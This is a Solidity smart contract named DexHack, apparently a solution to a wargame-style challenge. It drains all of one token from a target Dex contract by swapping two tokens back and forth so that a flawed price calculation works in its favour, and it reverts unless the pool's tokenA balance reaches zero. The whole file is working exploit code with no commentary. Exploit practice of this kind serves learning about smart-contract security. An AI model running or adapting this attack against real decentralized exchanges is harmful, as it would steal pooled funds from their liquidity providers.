// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Dex, IERC20} from "./Dex.sol";

error HackFailed();

contract DexHack {
    Dex private immutable target;
    IERC20 private immutable tokenA;
    IERC20 private immutable tokenB;

    constructor(address _target) {
        target = Dex(_target);
        tokenA = IERC20(target.token1());
        tokenB = IERC20(target.token2());
    }

    function attack() external {
        tokenA.transferFrom(msg.sender, address(this), 10);
        tokenB.transferFrom(msg.sender, address(this), 10);
        tokenA.approve(address(target), type(uint256).max);
        tokenB.approve(address(target), type(uint256).max);
        _swap(tokenA, tokenB);
        _swap(tokenB, tokenA);
        _swap(tokenA, tokenB);
        _swap(tokenB, tokenA);
        _swap(tokenA, tokenB);
        target.swap(address(tokenB), address(tokenA), 45);
        if (tokenA.balanceOf(address(target)) != 0) revert HackFailed();
    }

    function _swap(IERC20 tokenIn, IERC20 tokenOut) private {
        target.swap(address(tokenIn), address(tokenOut), tokenIn.balanceOf(address(this)));
    }
}
